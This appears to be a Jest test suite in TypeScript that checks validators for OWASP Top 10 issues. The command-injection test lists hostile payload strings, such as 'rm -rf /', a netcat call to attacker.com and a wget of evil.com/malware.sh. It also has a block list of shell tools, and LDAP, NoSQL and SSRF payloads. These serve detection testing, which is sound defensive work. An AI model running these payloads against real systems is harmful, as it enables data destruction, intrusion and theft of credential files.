// Comprehensive Penetration Testing Suite
import { SecurityUtils, SecurityMonitor } from '../utils/security';

describe('🎯 Penetration Testing Suite', () => {
  beforeEach(() => {
    SecurityMonitor.clearEvents();
  });

  describe('🔍 OWASP Top 10 Vulnerability Tests', () => {
    
    // A01:2021 – Broken Access Control
    describe('A01: Broken Access Control', () => {
      test('should prevent unauthorized access to admin functions', () => {
        const userRoles = ['guest', 'user', 'admin', 'superuser'];
        const adminFunctions = ['deleteUser', 'modifyPermissions', 'accessLogs', 'systemConfig'];
        
        const checkAccess = (userRole: string, functionName: string): boolean => {
          // Simulate access control check
          if (adminFunctions.includes(functionName) && userRole !== 'admin' && userRole !== 'superuser') {
            SecurityMonitor.logEvent('unauthorized_access_attempt', { userRole, functionName });
            return false;
          }
          return true;
        };
        
        // Test unauthorized access attempts
        expect(checkAccess('guest', 'deleteUser')).toBe(false);
        expect(checkAccess('user', 'modifyPermissions')).toBe(false);
        expect(checkAccess('admin', 'deleteUser')).toBe(true);
        
        const events = SecurityMonitor.getEvents();
        expect(events.filter(e => e.type === 'unauthorized_access_attempt')).toHaveLength(2);
      });

      test('should prevent horizontal privilege escalation', () => {
        const users = [
          { id: 1, username: 'alice', role: 'user' },
          { id: 2, username: 'bob', role: 'user' },
          { id: 3, username: 'admin', role: 'admin' }
        ];
        
        const canAccessUserData = (requestingUserId: number, targetUserId: number, requestingUserRole: string): boolean => {
          if (requestingUserId !== targetUserId && requestingUserRole !== 'admin') {
            SecurityMonitor.logEvent('horizontal_privilege_escalation', { 
              requestingUserId, 
              targetUserId,
              requestingUserRole
            });
            return false;
          }
          return true;
        };
        
        // Alice trying to access Bob's data
        expect(canAccessUserData(1, 2, 'user')).toBe(false);
        // Bob trying to access his own data
        expect(canAccessUserData(2, 2, 'user')).toBe(true);
        // Admin accessing any user's data
        expect(canAccessUserData(3, 1, 'admin')).toBe(true);
        
        const events = SecurityMonitor.getEvents();
        expect(events[0].type).toBe('horizontal_privilege_escalation');
      });
    });

    // A02:2021 – Cryptographic Failures
    describe('A02: Cryptographic Failures', () => {
      test('should detect weak password policies', () => {
        const weakPasswords = [
          '123456',
          'password',
          'qwerty',
          'abc123',
          '12345678',
          'password123',
          'admin',
          'letmein',
          'welcome',
          'monkey'
        ];
        
        const isStrongPassword = (password: string): boolean => {
          const minLength = 8;
          const hasUpperCase = /[A-Z]/.test(password);
          const hasLowerCase = /[a-z]/.test(password);
          const hasNumbers = /\d/.test(password);
          const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
          
          const isStrong = password.length >= minLength && hasUpperCase && hasLowerCase && hasNumbers && hasSpecialChar;
          
          if (!isStrong) {
            SecurityMonitor.logEvent('weak_password_detected', { 
              password: password.substring(0, 3) + '***', // Log only first 3 chars for security
              length: password.length,
              hasUpperCase,
              hasLowerCase,
              hasNumbers,
              hasSpecialChar
            });
          }
          
          return isStrong;
        };
        
        weakPasswords.forEach(password => {
          expect(isStrongPassword(password)).toBe(false);
        });
        
        // Test strong password
        expect(isStrongPassword('MyStr0ng!P@ssw0rd')).toBe(true);
        
        const events = SecurityMonitor.getEvents();
        expect(events).toHaveLength(weakPasswords.length);
      });

      test('should validate secure token generation', () => {
        const tokens = Array.from({ length: 100 }, () => SecurityUtils.generateSecureToken(32));
        
        // All tokens should be unique
        const uniqueTokens = new Set(tokens);
        expect(uniqueTokens.size).toBe(100);
        
        // All tokens should be 64 characters (32 bytes in hex)
        tokens.forEach(token => {
          expect(token).toHaveLength(64);
          expect(/^[a-f0-9]+$/i.test(token)).toBe(true);
        });
        
        // Test entropy (should have good distribution)
        const charCounts = tokens.join('').split('').reduce((acc, char) => {
          acc[char] = (acc[char] || 0) + 1;
          return acc;
        }, {} as Record<string, number>);
        
        // Should use most hex characters
        expect(Object.keys(charCounts).length).toBeGreaterThan(10);
      });
    });

    // A03:2021 – Injection
    describe('A03: Injection Attacks', () => {
      test('should prevent command injection', () => {
        const commandInjectionPayloads = [
          'file.txt; rm -rf /',
          'file.txt && cat /etc/passwd',
          'file.txt | nc attacker.com 4444',
          'file.txt; wget http://evil.com/malware.sh',
          'file.txt`whoami`',
          'file.txt$(id)',
          'file.txt; powershell -c "Get-Process"',
          'file.txt & dir c:\\',
          'file.txt || type c:\\windows\\system32\\config\\sam'
        ];
        
        const isValidFilename = (filename: string): boolean => {
          const dangerousChars = /[;&|`$(){}[\]<>]/;
          const dangerousCommands = /(rm|cat|nc|wget|curl|powershell|cmd|bash|sh|type|dir)/i;
          
          if (dangerousChars.test(filename) || dangerousCommands.test(filename)) {
            SecurityMonitor.logEvent('command_injection_attempt', { filename });
            return false;
          }
          
          return true;
        };
        
        commandInjectionPayloads.forEach(payload => {
          expect(isValidFilename(payload)).toBe(false);
        });
        
        // Valid filenames should pass
        expect(isValidFilename('document.pdf')).toBe(true);
        expect(isValidFilename('image-2024.jpg')).toBe(true);
      });

      test('should prevent LDAP injection', () => {
        const ldapInjectionPayloads = [
          'admin)(&(password=*))',
          'admin)(|(password=*))',
          '*)(&(objectClass=*))',
          'admin)(!(&(1=0)))',
          '*)((|(&)))',
          'admin)(|(cn=*))',
          '*))(|(objectClass=*'
        ];
        
        const isValidLdapQuery = (username: string): boolean => {
          const ldapSpecialChars = /[()&|!*]/;
          
          if (ldapSpecialChars.test(username)) {
            SecurityMonitor.logEvent('ldap_injection_attempt', { username });
            return false;
          }
          
          return true;
        };
        
        ldapInjectionPayloads.forEach(payload => {
          expect(isValidLdapQuery(payload)).toBe(false);
        });
        
        expect(isValidLdapQuery('validuser')).toBe(true);
      });

      test('should prevent NoSQL injection', () => {
        const nosqlInjectionPayloads = [
          '{"$ne": null}',
          '{"$gt": ""}',
          '{"$regex": ".*"}',
          '{"$where": "this.password.length > 0"}',
          '{"$or": [{"password": {"$exists": true}}]}',
          '{"username": {"$ne": "admin"}, "password": {"$ne": "admin"}}',
          '{"$func": "var_dump"}',
          '{"$eval": "db.users.find()"}',
          '{"password": {"$in": ["", null, undefined]}}'
        ];
        
        const isValidNoSqlQuery = (query: string): boolean => {
          const nosqlOperators = /\$(?:ne|gt|lt|gte|lte|in|nin|regex|where|or|and|not|exists|type|mod|all|size|elemMatch|func|eval)/;
          
          if (nosqlOperators.test(query)) {
            SecurityMonitor.logEvent('nosql_injection_attempt', { query });
            return false;
          }
          
          return true;
        };
        
        nosqlInjectionPayloads.forEach(payload => {
          expect(isValidNoSqlQuery(payload)).toBe(false);
        });
        
        expect(isValidNoSqlQuery('{"username": "john", "password": "hashedpassword"}')).toBe(true);
      });
    });

    // A04:2021 – Insecure Design
    describe('A04: Insecure Design', () => {
      test('should implement proper business logic validation', () => {
        interface Transaction {
          userId: number;
          amount: number;
          type: 'deposit' | 'withdrawal';
          accountBalance: number;
        }
        
        const validateTransaction = (transaction: Transaction): boolean => {
          // Business logic: prevent negative amounts
          if (transaction.amount <= 0) {
            SecurityMonitor.logEvent('invalid_transaction_amount', { 
              userId: transaction.userId,
              amount: transaction.amount
            });
            return false;
          }
          
          // Business logic: prevent overdraft
          if (transaction.type === 'withdrawal' && transaction.amount > transaction.accountBalance) {
            SecurityMonitor.logEvent('overdraft_attempt', {
              userId: transaction.userId,
              requestedAmount: transaction.amount,
              availableBalance: transaction.accountBalance
            });
            return false;
          }
          
          // Business logic: prevent unusually large transactions
          if (transaction.amount > 10000) {
            SecurityMonitor.logEvent('large_transaction_attempt', {
              userId: transaction.userId,
              amount: transaction.amount
            });
            return false;
          }
          
          return true;
        };
        
        // Test invalid transactions
        expect(validateTransaction({ userId: 1, amount: -100, type: 'deposit', accountBalance: 1000 })).toBe(false);
        expect(validateTransaction({ userId: 1, amount: 1500, type: 'withdrawal', accountBalance: 1000 })).toBe(false);
        expect(validateTransaction({ userId: 1, amount: 15000, type: 'deposit', accountBalance: 1000 })).toBe(false);
        
        // Test valid transaction
        expect(validateTransaction({ userId: 1, amount: 500, type: 'withdrawal', accountBalance: 1000 })).toBe(true);
      });

      test('should prevent race condition attacks', () => {
        let accountBalance = 1000;
        const pendingTransactions = new Set<string>();
        
        const processWithdrawal = (transactionId: string, amount: number): boolean => {
          // Check if transaction is already being processed
          if (pendingTransactions.has(transactionId)) {
            SecurityMonitor.logEvent('duplicate_transaction_attempt', { transactionId });
            return false;
          }
          
          // Add to pending transactions
          pendingTransactions.add(transactionId);
          
          // Simulate processing delay
          setTimeout(() => {
            if (accountBalance >= amount) {
              accountBalance -= amount;
            }
            pendingTransactions.delete(transactionId);
          }, 10);
          
          return accountBalance >= amount;
        };
        
        // Simulate race condition attack
        const result1 = processWithdrawal('tx1', 800);
        const result2 = processWithdrawal('tx1', 800); // Same transaction ID
        
        expect(result1).toBe(true);
        expect(result2).toBe(false); // Should be blocked
        
        const events = SecurityMonitor.getEvents();
        expect(events[0].type).toBe('duplicate_transaction_attempt');
      });
    });

    // A05:2021 – Security Misconfiguration
    describe('A05: Security Misconfiguration', () => {
      test('should detect insecure default configurations', () => {
        const configurations = [
          { name: 'debug', value: true, environment: 'production' },
          { name: 'cors_origin', value: '*', environment: 'production' },
          { name: 'ssl_verify', value: false, environment: 'production' },
          { name: 'admin_password', value: 'admin', environment: 'production' },
          { name: 'session_timeout', value: 86400, environment: 'production' }, // 24 hours
          { name: 'error_reporting', value: 'full', environment: 'production' }
        ];
        
        const validateConfiguration = (config: typeof configurations[0]): boolean => {
          if (config.environment === 'production') {
            switch (config.name) {
              case 'debug':
                if (config.value === true) {
                  SecurityMonitor.logEvent('insecure_config', { 
                    setting: config.name, 
                    issue: 'debug_enabled_in_production' 
                  });
                  return false;
                }
                break;
              case 'cors_origin':
                if (config.value === '*') {
                  SecurityMonitor.logEvent('insecure_config', { 
                    setting: config.name, 
                    issue: 'wildcard_cors_in_production' 
                  });
                  return false;
                }
                break;
              case 'ssl_verify':
                if (config.value === false) {
                  SecurityMonitor.logEvent('insecure_config', { 
                    setting: config.name, 
                    issue: 'ssl_verification_disabled' 
                  });
                  return false;
                }
                break;
              case 'admin_password':
                if (config.value === 'admin' || config.value === 'password') {
                  SecurityMonitor.logEvent('insecure_config', { 
                    setting: config.name, 
                    issue: 'default_admin_password' 
                  });
                  return false;
                }
                break;
              case 'session_timeout':
                if (typeof config.value === 'number' && config.value > 3600) { // More than 1 hour
                  SecurityMonitor.logEvent('insecure_config', { 
                    setting: config.name, 
                    issue: 'excessive_session_timeout' 
                  });
                  return false;
                }
                break;
              case 'error_reporting':
                if (config.value === 'full') {
                  SecurityMonitor.logEvent('insecure_config', { 
                    setting: config.name, 
                    issue: 'verbose_errors_in_production' 
                  });
                  return false;
                }
                break;
            }
          }
          return true;
        };
        
        configurations.forEach(config => {
          expect(validateConfiguration(config)).toBe(false);
        });
        
        const events = SecurityMonitor.getEvents();
        expect(events).toHaveLength(configurations.length);
      });
    });

    // A06:2021 – Vulnerable and Outdated Components
    describe('A06: Vulnerable and Outdated Components', () => {
      test('should detect vulnerable dependencies', () => {
        const mockDependencies = [
          { name: 'lodash', version: '4.17.15', vulnerabilities: ['CVE-2020-8203'] },
          { name: 'axios', version: '0.18.0', vulnerabilities: ['CVE-2019-10742'] },
          { name: 'react', version: '16.8.0', vulnerabilities: [] },
          { name: 'express', version: '4.16.0', vulnerabilities: ['CVE-2019-5413'] },
          { name: 'jsonwebtoken', version: '8.5.0', vulnerabilities: ['CVE-2022-23529'] }
        ];
        
        const checkVulnerabilities = (dependencies: typeof mockDependencies): string[] => {
          const vulnerableDeps: string[] = [];
          
          dependencies.forEach(dep => {
            if (dep.vulnerabilities.length > 0) {
              SecurityMonitor.logEvent('vulnerable_dependency_detected', {
                name: dep.name,
                version: dep.version,
                vulnerabilities: dep.vulnerabilities
              });
              vulnerableDeps.push(dep.name);
            }
          });
          
          return vulnerableDeps;
        };
        
        const vulnerable = checkVulnerabilities(mockDependencies);
        expect(vulnerable).toContain('lodash');
        expect(vulnerable).toContain('axios');
        expect(vulnerable).toContain('express');
        expect(vulnerable).toContain('jsonwebtoken');
        expect(vulnerable).not.toContain('react');
        
        const events = SecurityMonitor.getEvents();
        expect(events).toHaveLength(4);
      });
    });

    // A07:2021 – Identification and Authentication Failures
    describe('A07: Identification and Authentication Failures', () => {
      test('should prevent credential stuffing attacks', () => {
        const commonCredentials = [
          { username: 'admin', password: 'admin' },
          { username: 'admin', password: 'password' },
          { username: 'admin', password: '123456' },
          { username: 'root', password: 'root' },
          { username: 'user', password: 'user' },
          { username: 'test', password: 'test' },
          { username: 'guest', password: 'guest' }
        ];
        
        const attemptedCredentials = new Set<string>();
        
        const authenticateUser = (username: string, password: string): boolean => {
          const credentialKey = `${username}:${password}`;
          
          // Check if this exact credential combination has been tried before
          if (attemptedCredentials.has(credentialKey)) {
            SecurityMonitor.logEvent('credential_reuse_attempt', { username });
            return false;
          }
          
          attemptedCredentials.add(credentialKey);
          
          // Check against common credentials
          const isCommonCredential = commonCredentials.some(
            cred => cred.username === username && cred.password === password
          );
          
          if (isCommonCredential) {
            SecurityMonitor.logEvent('common_credential_attempt', { username, password: '***' });
            return false;
          }
          
          // Simulate successful authentication for non-common credentials
          return !isCommonCredential;
        };
        
        commonCredentials.forEach(cred => {
          expect(authenticateUser(cred.username, cred.password)).toBe(false);
        });
        
        // Valid credentials should work
        expect(authenticateUser('john.doe', 'MySecur3P@ssw0rd!')).toBe(true);
        
        const events = SecurityMonitor.getEvents();
        expect(events.filter(e => e.type === 'common_credential_attempt')).toHaveLength(commonCredentials.length);
      });

      test('should implement account lockout mechanisms', () => {
        const userAttempts = new Map<string, { count: number; lastAttempt: number; lockedUntil?: number }>();
        const maxAttempts = 5;
        const lockoutDuration = 15 * 60 * 1000; // 15 minutes
        
        const attemptLogin = (username: string, password: string, isValidCredential: boolean): boolean => {
          const now = Date.now();
          const userRecord = userAttempts.get(username) || { count: 0, lastAttempt: 0 };
          
          // Check if account is locked
          if (userRecord.lockedUntil && now < userRecord.lockedUntil) {
            SecurityMonitor.logEvent('locked_account_access_attempt', { 
              username, 
              lockedUntil: userRecord.lockedUntil 
            });
            return false;
          }
          
          // Reset attempts if lockout period has expired
          if (userRecord.lockedUntil && now >= userRecord.lockedUntil) {
            userRecord.count = 0;
            userRecord.lockedUntil = undefined;
          }
          
          if (isValidCredential) {
            // Reset failed attempts on successful login
            userRecord.count = 0;
            userRecord.lockedUntil = undefined;
            userAttempts.set(username, userRecord);
            return true;
          } else {
            // Increment failed attempts
            userRecord.count++;
            userRecord.lastAttempt = now;
            
            if (userRecord.count >= maxAttempts) {
              userRecord.lockedUntil = now + lockoutDuration;
              SecurityMonitor.logEvent('account_locked', { 
                username, 
                attempts: userRecord.count,
                lockedUntil: userRecord.lockedUntil
              });
            }
            
            userAttempts.set(username, userRecord);
            
            SecurityMonitor.logEvent('failed_login_attempt', { 
              username, 
              attemptCount: userRecord.count 
            });
            
            return false;
          }
        };
        
        const username = 'testuser';
        
        // Simulate 5 failed attempts
        for (let i = 0; i < 5; i++) {
          expect(attemptLogin(username, 'wrongpassword', false)).toBe(false);
        }
        
        // 6th attempt should be blocked due to lockout
        expect(attemptLogin(username, 'wrongpassword', false)).toBe(false);
        
        const events = SecurityMonitor.getEvents();
        expect(events.filter(e => e.type === 'account_locked')).toHaveLength(1);
        expect(events.filter(e => e.type === 'locked_account_access_attempt')).toHaveLength(1);
      });
    });

    // A08:2021 – Software and Data Integrity Failures
    describe('A08: Software and Data Integrity Failures', () => {
      test('should validate data integrity with checksums', () => {
        const criticalData = [
          { id: 1, content: 'Important data 1', checksum: 'abc123' },
          { id: 2, content: 'Important data 2', checksum: 'def456' },
          { id: 3, content: 'Important data 3', checksum: 'ghi789' }
        ];
        
        const calculateChecksum = (content: string): string => {
          // Simple checksum calculation (in real app, use proper hashing)
          return content.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0).toString(16);
        };
        
        const validateDataIntegrity = (data: typeof criticalData[0]): boolean => {
          const expectedChecksum = calculateChecksum(data.content);
          
          if (data.checksum !== expectedChecksum) {
            SecurityMonitor.logEvent('data_integrity_violation', {
              dataId: data.id,
              expectedChecksum,
              actualChecksum: data.checksum
            });
            return false;
          }
          
          return true;
        };
        
        // Test with tampered data
        const tamperedData = { ...criticalData[0], content: 'Tampered data 1' };
        expect(validateDataIntegrity(tamperedData)).toBe(false);
        
        // Test with valid data (update checksum)
        const validData = { 
          ...criticalData[0], 
          checksum: calculateChecksum(criticalData[0].content) 
        };
        expect(validateDataIntegrity(validData)).toBe(true);
        
        const events = SecurityMonitor.getEvents();
        expect(events[0].type).toBe('data_integrity_violation');
      });
    });

    // A09:2021 – Security Logging and Monitoring Failures
    describe('A09: Security Logging and Monitoring Failures', () => {
      test('should log all security-relevant events', () => {
        const securityEvents = [
          'login_success',
          'login_failure',
          'password_change',
          'permission_change',
          'data_access',
          'admin_action',
          'suspicious_activity',
          'system_error'
        ];
        
        const logSecurityEvent = (eventType: string, details: any): void => {
          const logEntry = {
            timestamp: new Date().toISOString(),
            eventType,
            details,
            severity: getSeverity(eventType),
            source: 'security-test'
          };
          
          SecurityMonitor.logEvent(eventType, logEntry);
        };
        
        const getSeverity = (eventType: string): 'low' | 'medium' | 'high' | 'critical' => {
          const severityMap: Record<string, 'low' | 'medium' | 'high' | 'critical'> = {
            'login_success': 'low',
            'login_failure': 'medium',
            'password_change': 'medium',
            'permission_change': 'high',
            'data_access': 'medium',
            'admin_action': 'high',
            'suspicious_activity': 'critical',
            'system_error': 'high'
          };
          
          return severityMap[eventType] || 'medium';
        };
        
        securityEvents.forEach(eventType => {
          logSecurityEvent(eventType, { testData: `test-${eventType}` });
        });
        
        const events = SecurityMonitor.getEvents();
        expect(events).toHaveLength(securityEvents.length);
        
        // Verify critical events are properly flagged
        const criticalEvents = events.filter(e => e.details.severity === 'critical');
        expect(criticalEvents).toHaveLength(1);
        expect(criticalEvents[0].type).toBe('suspicious_activity');
      });
    });

    // A10:2021 – Server-Side Request Forgery (SSRF)
    describe('A10: Server-Side Request Forgery (SSRF)', () => {
      test('should prevent SSRF attacks', () => {
        const maliciousUrls = [
          'http://localhost:22',
          'http://127.0.0.1:3306',
          'http://169.254.169.254/latest/meta-data/',
          'file:///etc/passwd',
          'ftp://internal-server/sensitive-data',
          'http://internal-admin-panel.local',
          'http://192.168.1.1/admin',
          'http://10.0.0.1:8080/management',
          'gopher://127.0.0.1:6379/_INFO'
        ];
        
        const isValidExternalUrl = (url: string): boolean => {
          try {
            const urlObj = new URL(url);
            
            // Only allow HTTP and HTTPS
            if (!['http:', 'https:'].includes(urlObj.protocol)) {
              SecurityMonitor.logEvent('ssrf_attempt', { 
                url, 
                reason: 'invalid_protocol',
                protocol: urlObj.protocol
              });
              return false;
            }
            
            // Block localhost and private IP ranges
            const hostname = urlObj.hostname.toLowerCase();
            const privateRanges = [
              'localhost',
              '127.0.0.1',
              '0.0.0.0',
              '169.254.169.254', // AWS metadata
              '::1'
            ];
            
            if (privateRanges.includes(hostname)) {
              SecurityMonitor.logEvent('ssrf_attempt', { 
                url, 
                reason: 'private_ip_access',
                hostname
              });
              return false;
            }
            
            // Block private IP ranges
            if (hostname.match(/^10\./) || 
                hostname.match(/^192\.168\./) || 
                hostname.match(/^172\.(1[6-9]|2[0-9]|3[0-1])\./)) {
              SecurityMonitor.logEvent('ssrf_attempt', { 
                url, 
                reason: 'private_network_access',
                hostname
              });
              return false;
            }
            
            // Block non-standard ports
            const port = urlObj.port;
            if (port && !['80', '443', '8080', '8443'].includes(port)) {
              SecurityMonitor.logEvent('ssrf_attempt', { 
                url, 
                reason: 'suspicious_port',
                port
              });
              return false;
            }
            
            return true;
          } catch (error) {
            SecurityMonitor.logEvent('ssrf_attempt', { 
              url, 
              reason: 'invalid_url',
              error: error instanceof Error ? error.message : 'Unknown error'
            });
            return false;
          }
        };
        
        maliciousUrls.forEach(url => {
          expect(isValidExternalUrl(url)).toBe(false);
        });
        
        // Valid external URLs should pass
        expect(isValidExternalUrl('https://api.github.com/users')).toBe(true);
        expect(isValidExternalUrl('https://jsonplaceholder.typicode.com/posts')).toBe(true);
        
        const events = SecurityMonitor.getEvents();
        expect(events).toHaveLength(maliciousUrls.length);
      });
    });
  });

  describe('🔬 Advanced Attack Simulation', () => {
    test('should simulate multi-stage attack', () => {
      // Stage 1: Reconnaissance
      SecurityMonitor.logEvent('reconnaissance', { 
        stage: 1, 
        activity: 'port_scanning',
        target: 'application_endpoints'
      });
      
      // Stage 2: Initial Access
      SecurityMonitor.logEvent('initial_access', { 
        stage: 2, 
        method: 'credential_stuffing',
        success: false
      });
      
      // Stage 3: Privilege Escalation
      SecurityMonitor.logEvent('privilege_escalation', { 
        stage: 3, 
        method: 'exploit_vulnerability',
        success: false
      });
      
      // Stage 4: Lateral Movement
      SecurityMonitor.logEvent('lateral_movement', { 
        stage: 4, 
        method: 'network_scanning',
        blocked: true
      });
      
      // Stage 5: Data Exfiltration Attempt
      SecurityMonitor.logEvent('data_exfiltration', { 
        stage: 5, 
        method: 'bulk_download',
        prevented: true
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events).toHaveLength(5);
      
      // Verify attack chain detection
      const attackStages = events.map(e => e.details.stage).sort();
      expect(attackStages).toEqual([1, 2, 3, 4, 5]);
      
      // All attacks should be blocked/prevented
      const preventedAttacks = events.filter(e => 
        e.details.success === false || 
        e.details.blocked === true || 
        e.details.prevented === true
      );
      expect(preventedAttacks).toHaveLength(4);
    });

    test('should detect coordinated attack patterns', () => {
      const attackSources = ['192.168.1.100', '192.168.1.101', '192.168.1.102'];
      const attackTypes = ['brute_force', 'sql_injection', 'xss_attempt'];
      
      // Simulate coordinated attack from multiple sources
      attackSources.forEach((source, index) => {
        attackTypes.forEach(attackType => {
          SecurityMonitor.logEvent('coordinated_attack', {
            source,
            attackType,
            timestamp: Date.now() + (index * 1000),
            coordinated: true
          });
        });
      });
      
      const events = SecurityMonitor.getEvents();
      expect(events).toHaveLength(9); // 3 sources × 3 attack types
      
      // Analyze attack pattern
      const sourceCount = new Set(events.map(e => e.details.source)).size;
      const attackTypeCount = new Set(events.map(e => e.details.attackType)).size;
      
      expect(sourceCount).toBe(3);
      expect(attackTypeCount).toBe(3);
      
      // All events should be marked as coordinated
      const coordinatedEvents = events.filter(e => e.details.coordinated === true);
      expect(coordinatedEvents).toHaveLength(9);
    });
  });
});